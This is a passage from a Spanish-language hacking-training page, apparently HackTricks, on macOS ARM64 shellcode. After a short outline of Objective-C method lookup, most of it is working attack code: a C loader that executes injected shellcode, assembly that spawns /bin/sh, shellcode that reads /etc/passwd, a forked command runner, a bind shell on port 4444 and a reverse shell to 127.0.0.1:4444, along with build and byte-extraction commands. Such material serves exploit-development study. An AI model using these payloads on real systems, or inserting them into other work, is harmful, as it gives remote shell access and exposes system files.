Cuando se llama a esta función, es necesario encontrar el método invocado de la instancia indicada; para ello se realizan distintas búsquedas:

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extraer los bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Para macOS más recientes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code para probar el shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tomado de [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) y explicado.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Leer con cat

El objetivo es ejecutar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, así que el segundo argumento (x1) es un array de parámetros (lo que en memoria significa una pila de direcciones).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando con sh desde un fork para que el proceso principal no sea terminado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell desde [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) en **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Desde [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
